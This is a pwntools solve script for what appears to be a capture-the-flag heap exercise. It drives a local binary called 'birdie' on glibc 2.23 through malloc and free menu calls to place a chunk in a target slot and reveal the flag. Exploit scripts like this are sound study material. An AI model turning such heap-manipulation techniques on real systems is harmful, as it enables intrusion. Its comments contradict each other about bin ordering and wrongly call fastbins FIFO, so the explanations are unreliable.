from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.birdie'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = process([elf.path],env=env)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23/
''')

# Malloc
def birdie():
	p.sendlineafter(">", "1") 

# Free
def bogey():
	p.sendlineafter(">", "2") 

# Find flag
def flag():
	p.sendlineafter(">", "3") 


'''
At the start of the program, the heap has allocated FIVE items. 

We want the SECOND item to become the new TENTH item. 
The is the unsorted bin so it is LAST IN FIRST OUT
'''

# Get the COUNT of stored items up to 8
for i in range(4):
	birdie()

'''
Now, the unsorted bin is COMPLETELY empty and we want the current SECOND item
to become the new TENTH item. 

So, we will free TWO items. Because the fastbin is FIFO the SECOND item is
now at the BACK of the linked list. 

Ptr2 -> Ptr1, where we want Ptr2
'''

# Bogey twice in order to get BOTH items on the list. 
bogey()
bogey()

# Removes Ptr1 pointing at the FRONT Of the linked list - slot 9
birdie()

# Puts Ptr2 into slot 10 
birdie() 

# Winner@!
flag()
p.interactive()
